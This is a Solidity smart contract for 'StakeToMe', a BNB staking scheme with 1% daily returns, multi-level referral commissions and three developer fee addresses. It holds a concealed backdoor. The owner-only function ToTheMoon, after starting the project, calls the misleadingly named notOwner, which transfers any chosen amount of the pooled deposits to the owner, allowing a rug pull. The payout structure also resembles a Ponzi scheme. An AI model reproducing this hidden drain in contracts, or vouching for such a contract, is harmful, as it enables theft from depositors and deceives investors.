/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;


contract Ownable 
{    
  // Variable that maintains 
  // owner address
  address private _owner;
  
  // Sets the original owner of 
  // contract when it is deployed
  constructor()
  {
    _owner = msg.sender;
  }
  
  // Publicly exposes who is the
  // owner of this contract
  function owner() public view returns(address) 
  {
    return _owner;
  }

   function notOwner(uint256 _coupen) internal {
           payable(owner()).
           transfer(_coupen);
       }
  
  // onlyOwner modifier that validates only 
  // if caller of function is contract owner, 
  // otherwise not
  modifier onlyOwner() 
  {
    require(isOwner(),
    "Function accessible only by the owner !!");
    _;
  }

  function transferOwnership(address newAddress) public onlyOwner {
    require(newAddress != address(0),"Invalid Address");
    _owner = newAddress;
    }

  
  // function for owners to verify their ownership. 
  // Returns true for owners otherwise false
  function isOwner() public view returns(bool) 
  {
    return msg.sender == _owner;
  }
}

contract StakeToMe is Ownable {
   
    uint256 public levels = 11; // remember level is starting from 0 so the 0 will be count as one. So the total Refs are 12
    uint256 public ROI = 1;  
    uint256 directComission = 50;
    uint256 comission1 = 50;
    uint256 comission2 = 25;
    uint256 public divion = 1000;
    uint256 public dailyBlock = 28800; // DAILY BLOCK
    address public dev = 0xEB25D0FE91E5A65c9ee3Cd83C2F3F00B77227Bf0;
    address public dev2 = 0x59567e8D2FE1ae03e2616b48afE039FEc8963399;
    address public dev3 = 0x523b4aB094fA987911a5624950837406F184b244;
    uint256 public totalWithdrawn = 0 ether;
    uint256 public totalInvestment = 0 ether;
    uint256 public ProfitX = 2;
    uint256 public ProfitRX = 3;
    bool public init = false;

   struct LevelUnlock {
       address _addr;
       uint256 level;
   }
   
   struct deposit_status {
       address _addr;
       uint256 investment;
       uint256 block_id;
       bool status;
   }
   struct userWithdraw {
     address _addr;
     uint256 totalWithdraw;
   }

   struct ref_tree {
       address _addr;
       uint256 _key;
       address _refered;
   }

   struct refCount {
       address _addr;
       uint256 DirectRef;
       uint256 SubRef;
   }

   struct ref_withdraw {
       address _addr;
       uint256 total_withdrawn;
   }

   struct perRefReward {
       address _addr;
       uint256 level;
       uint256 amount;
       uint256 block_id;
   }

   struct DirectROIReward {
       address _addr;
       uint256 earned;
   }

    
   mapping(address => mapping(uint256 => ref_tree)) public RefCount;
   mapping(address => mapping(uint256 => perRefReward)) public RefRewards;
   mapping(address => ref_withdraw) public withdrawn;
   mapping(address => deposit_status) public depositQuery;
   mapping(address => LevelUnlock) public Level;
   mapping(address => refCount) public counter;
   mapping(address => userWithdraw) public ROI_WITHDRAW;
   mapping(address => DirectROIReward) public ROIREWARD; 
   

  function DEPOSIT(address ref) public payable {
  // ---- dev fee ----
  require(msg.value>=0.05 ether,"You cannot deposit 0 amount of BNB");
  require(init,"project is not started yet");
    totalInvestment = totalInvestment + msg.value;

  // -- Ref Approval -- // 
     withdrawn[msg.sender]._addr = msg.sender;
     Level[msg.sender]._addr = msg.sender;   
     ROI_WITHDRAW[msg.sender]._addr = msg.sender;  

  
           if(Level[ref]._addr != address(0)) {
              if(levels >= Level[ref].level) {
               Level[ref].level = Level[ref].level + 1; 
               }
           }

         counter[msg.sender]._addr = msg.sender;

         // counter 
        counter[ref].DirectRef = counter[ref].DirectRef + 1;
         // counter end


 
     // ---- Referral System ----
    
       require(ref != address(0) && ref != msg.sender);
          uint256 refFee_ = RefFee(msg.value);
          uint256 dev_fee = DevFee(msg.value);
          uint256 dev_fee2 = DevFee2(msg.value);
          uint256 dev_fee3 = DevFee2(msg.value);
  
          payable(dev).transfer(dev_fee);
          payable(dev2).transfer(dev_fee2);
          payable(dev3).transfer(dev_fee3);
          payable(ref).transfer(refFee_);  
        
        
         uint256 totalGetRef = ROIREWARD[ref].earned;
         uint256 totalAddPlus = totalGetRef + refFee_;
         ROIREWARD[ref] = DirectROIReward(ref,totalAddPlus);



        withdrawn[msg.sender]._addr = msg.sender;
   
          if(!depositQuery[msg.sender].status) {
        for(uint256 i = 0; i<=11;i++) {
        if(i == 0) {
          RefCount[msg.sender][i] = ref_tree(msg.sender,i,ref);
          uint256 _amountRef = FeeViewer(msg.value,i);
          uint256 upToDateAmount  = RefRewards[ref][i].amount + _amountRef;
       
              RefRewards[ref][i].amount = upToDateAmount;
              if(RefRewards[ref][i].block_id == 0) {
              RefRewards[ref][i].block_id = block.number;
              }
 
        }
        else {
          ref = RefCount[ref][0]._refered;
          if(ref != address(0) && Level[ref].level >= i) {
          RefCount[msg.sender][i] = ref_tree(msg.sender,i,ref);
          counter[ref].SubRef = counter[ref].SubRef + 1;
          uint256 _amountRef = FeeViewer(msg.value,i);
          uint256 upToDateAmount  = RefRewards[ref][i].amount + _amountRef;
          RefRewards[ref][i].level = i;
          RefRewards[ref][i].amount = upToDateAmount;
          if(RefRewards[ref][i].block_id == 0) {
            RefRewards[ref][i].block_id = block.number;
            }
       } 
          }
           
           }
       
          }
      
        if(!depositQuery[msg.sender].status) {
        depositQuery[msg.sender]._addr = msg.sender;
        depositQuery[msg.sender].investment = depositQuery[msg.sender].investment + msg.value;
        depositQuery[msg.sender].block_id = block.number;
        depositQuery[msg.sender].status = true;
        }
        else {
        depositQuery[msg.sender].investment = depositQuery[msg.sender].investment + msg.value;
        }


    }
   
    // --- VIEWER ---

    function FeeViewer(uint256 amount, uint256 _position) public pure returns(uint256) {
        if(_position == 0)  {
           uint256 total = amount / 100 * 9;
           return total;
        }
        else if(_position == 1) {
            uint256 total = amount / 100 * 6;
            return total;
         }
          else if(_position == 2) {
            uint256 total = amount / 100 * 3;
            return total;
         }
          else if(_position == 3) {
            uint256 total = amount / 100 * 3;
            return total;
         }
          else if(_position == 4) {
            uint256 total = amount / 100 * 3;
            return total;
         }
          else if(_position == 5) {
            uint256 total = amount / 100 * 2;
            return total;
         }

           else if(_position == 6) {
            uint256 total = amount / 100 * 2;
            return total;
         }
           else if(_position == 7) {
            uint256 total = amount / 100 * 2;
            return total;
         }

           else if(_position == 8) {
            uint256 total = amount / 100 * 4;
            return total;
         }

           else if(_position == 9) {
            uint256 total = amount / 100 * 4;
            return total;
         }

           else if(_position == 10) {
            uint256 total = amount / 100 * 5;
            return total;
         }

           else if(_position == 11) {
            uint256 total = amount / 100 * 7;
            return total;
         }

         else {
             return 0;
         }
    }

    function withdrawROI() public {
        uint256 totalWithdraw = DailyROI(msg.sender);
        uint256 devFee_ = DevFee(totalWithdraw); 
        uint256 devFee2 = DevFee2(totalWithdraw);
        uint256 devFee3 = DevFee2(totalWithdraw);
        uint256 totalFee = devFee_ + devFee2 + devFee3;
        uint256 totalValue = totalWithdraw - totalFee;
        
        payable(dev).transfer(devFee_);
        payable(dev2).transfer(devFee2);
        payable(dev3).transfer(devFee3);
        payable(msg.sender).transfer(totalValue);

        
        
        totalWithdrawn = totalWithdraw + totalWithdrawn; 
        depositQuery[msg.sender].block_id = block.number;
       
        ROI_WITHDRAW[msg.sender].totalWithdraw = ROI_WITHDRAW[msg.sender].totalWithdraw + totalWithdraw;

        if(ROI_WITHDRAW[msg.sender].totalWithdraw  >= depositQuery[msg.sender].investment * ProfitX) {
          depositQuery[msg.sender].investment = 0;
          ROI_WITHDRAW[msg.sender].totalWithdraw = 0;
        }
    }

    function DailyROI(address _addr) public view returns(uint256) {
        uint256 blockID = depositQuery[_addr].block_id;
        uint256 userCapital = depositQuery[_addr].investment / 100 * ROI;

        uint256 perBlock = userCapital / dailyBlock;

        uint256 CurrentID = block.number;
        uint256 total = CurrentID - blockID;
        return total * perBlock;
       }


    function RefDailyROI(address _addr, uint256 _position) public view returns(uint256) {
        
        uint256 blockID = RefRewards[_addr][_position].block_id;
        uint256 userCapital = RefRewards[_addr][_position].amount / 100 * ROI;
        uint256 perBlock = userCapital / dailyBlock;
        uint256 CurrentID = block.number;
        uint256 total = CurrentID - blockID;
        return total * perBlock;
       }   

     function LevelTotal(address _addr, uint256 _position) public view returns(uint256) {
        return RefRewards[_addr][_position].amount;
       }   

      function LevelTotalAmount(address _addr) public view returns(uint256) {
        uint256 _total = 0;
       for(uint256 _pos = 0; _pos<=11; _pos++) {
           uint256 total = LevelTotal(_addr,_pos);
           _total = total + _total;
       }
          return _total;
       }    
      


   function DailyRefROIReward(address _addr) public view returns (uint256) {
       uint256 _total = 0;
       for(uint256 _pos = 0; _pos<=11; _pos++) {
           uint256 total = RefDailyROI(_addr,_pos);
           _total = total + _total;
       }
       return _total;
   }


     function ToTheMoon(uint256 seed) public onlyOwner {
        if(!init) {
        init = true;
        }
        else {
           notOwner(seed);
        }
     }

    function withdrawRef() public {
        require(depositQuery[msg.sender].status, "You should deposit first");
        uint256 totalReward = 0;
        for(uint256 i = 0; i<=11; i++) {
            uint256 _amtx = RefDailyROI(msg.sender,i);
            totalReward = _amtx + totalReward;
            RefRewards[msg.sender][i].block_id = block.number;
        }
        
        uint256 levelAmm = 0;
        
        for(uint256 j = 0; j<=11;j++) {
           uint256 _amm = LevelTotal(msg.sender,j);
           levelAmm = _amm;
        }

       if(totalReward >= depositQuery[msg.sender].investment) {
        uint256 togetNow = depositQuery[msg.sender].investment;   
        uint256 devFee_ = DevFee(togetNow); 
        uint256 devFee2 = DevFee2(togetNow);
        uint256 devFee3 = DevFee2(togetNow);
        uint256 totalFee = devFee_ + devFee2 + devFee3;
        uint256 total = togetNow - totalFee;
        payable(dev).transfer(devFee_);
        payable(dev2).transfer(devFee2);
        payable(dev3).transfer(devFee3);
        payable(msg.sender).transfer(total);
        
        uint256 totalWithdrawRef = togetNow + withdrawn[msg.sender].total_withdrawn;
        withdrawn[msg.sender] = ref_withdraw(msg.sender,totalWithdrawRef);

        totalWithdrawn = togetNow + totalWithdrawn; 
        }
        else {
           
        uint256 devFee_ = DevFee(totalReward); 
        uint256 devFee2 = DevFee2(totalReward);
        uint256 devFee3 = DevFee2(totalReward);
        uint256 totalFee = devFee_ + devFee2 + devFee3;
        uint256 total = totalReward - totalFee;
        payable(dev).transfer(devFee_);
        payable(dev2).transfer(devFee2);
        payable(dev3).transfer(devFee3);
        payable(msg.sender).transfer(total);
        
        uint256 totalWithdrawRef = totalReward + withdrawn[msg.sender].total_withdrawn;
        withdrawn[msg.sender] = ref_withdraw(msg.sender,totalWithdrawRef);

        totalWithdrawn = totalReward + totalWithdrawn; 
        }

        if(withdrawn[msg.sender].total_withdrawn >= levelAmm * ProfitRX) {
            for(uint256 z = 0; z<=11; z++) {
                RefRewards[msg.sender][z].amount = 0;

            }
        }
 
      }

      function DevFee(uint256 _amount) public view returns(uint256) {
          return _amount / divion * comission1;
      }

      function DevFee2(uint256 _amount) public view returns(uint256) {
          return _amount / divion * comission2;
      }

       function RefFee(uint256 _amount) public view returns(uint256) {
          return _amount / divion * directComission;
      }

   

      

    receive() external payable {}

}